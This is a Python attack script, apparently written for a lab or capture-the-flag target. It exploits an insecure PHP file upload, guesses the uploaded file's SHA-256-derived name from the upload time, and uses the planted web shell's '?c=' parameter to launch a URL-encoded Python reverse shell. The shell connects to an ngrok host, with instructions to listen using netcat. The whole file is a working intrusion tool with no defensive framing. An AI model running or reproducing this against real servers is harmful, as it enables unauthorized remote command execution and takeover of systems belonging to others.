#!/usr/bin/python3 
from bs4 import BeautifulSoup
import requests, json, time, hashlib
from configparser import ConfigParser

config_object = ConfigParser()
config_object.read(".config")

SERVERCONFIG = config_object["SERVERCONFIG"]
HOST = SERVERCONFIG['HOST']
URL_UPLOAD = SERVERCONFIG['URL_UPLOAD']
UPLOAD_FOLDER_PATH = SERVERCONFIG['UPLOAD_FOLDER_PATH']
PORT = SERVERCONFIG['PORT']
PAYLOAD = SERVERCONFIG['PAYLOAD']

def pingUrl(URL):
	resp = requests.get(URL)
	if(resp.status_code == 200):
		print('[O_O] -		Ping Suceed.')
		return True
	print('[O_O] -		Ping Failed - ' + str(resp.status_code))
	return False

def getSHA256FilePath(PAYLOAD, UPLOAD_PATH, TIME, INDEX, FILE_EXT, HOST):
	TIME = int(TIME) + INDEX
	strTohash = PAYLOAD + str(TIME)
	hash = hashlib.sha256(strTohash.encode('utf-8')).hexdigest()
	dest = HOST + UPLOAD_PATH + hash + "." + FILE_EXT
	print(f"[O_O] -		TIME {INDEX}s: " + dest)
	return dest


def upload_payload(PAYLOAD, URL_UPLOAD):
	print(f'[O_O] - URL: {URL_UPLOAD}\n[O_O] - PAYLOAD_FILE: {PAYLOAD}')
	with open(PAYLOAD, 'rb') as file:
		multiple_files = [
		 ('submit', (None,"Envoyer")),
		 ('file_to_upload', (PAYLOAD, file, 'text/plain'))]
		resp = requests.post(f'{URL_UPLOAD}index.php', files=multiple_files)
		return resp

def parse_resp(resp):
	soup = BeautifulSoup(resp.content, "html.parser")
	text = soup.text.split('\n')
	text = [x for x in text if x]
	if('uploaded' in text[2]):
		print('[O_O] - Upload Suceed !!')
		return True
	else:
		print('[O_O] - Upload failed.')
		return False

def gain_access():
	for i in range(-2,5):
		filepath = getSHA256FilePath(PAYLOAD, UPLOAD_FOLDER_PATH, TIME, i, FILE_EXT, HOST)
		if(pingUrl(filepath)):
			return filepath
	return False

def getReverseShell(NGROK_URL, NGROK_PORT, URL):
	print('[O_O] - Starting attack')
	PAYLOAD = f"python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22{NGROK_URL}%22%2C{NGROK_PORT}))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B'"
	resp = requests.get(URL+'?c='+PAYLOAD)
	
TIME = time.time()
resp = upload_payload(PAYLOAD, URL_UPLOAD)
if(parse_resp(resp)):
	print('[O_O] - Trying to gain access...')
	URL_ACCESS = gain_access()
	if(URL_ACCESS):
		print('[O_O] - Succed to gain access...')
		print('[O_O] - Run:')
		print(f'[O_O] -------> tty1: ngrok tcp {PORT}')
		print(f'[O_O] -------> tty2: nc -lvp {PORT}')
		NGROK_URL = input('[O_O] - NGROK_URL: ')
		NGROK_PORT = input('[O_O] - NGROK_PORT: ')
		getReverseShell(NGROK_URL, NGROK_PORT, URL_ACCESS)
	else:
		print('[O_O] - Failed to gain access...')


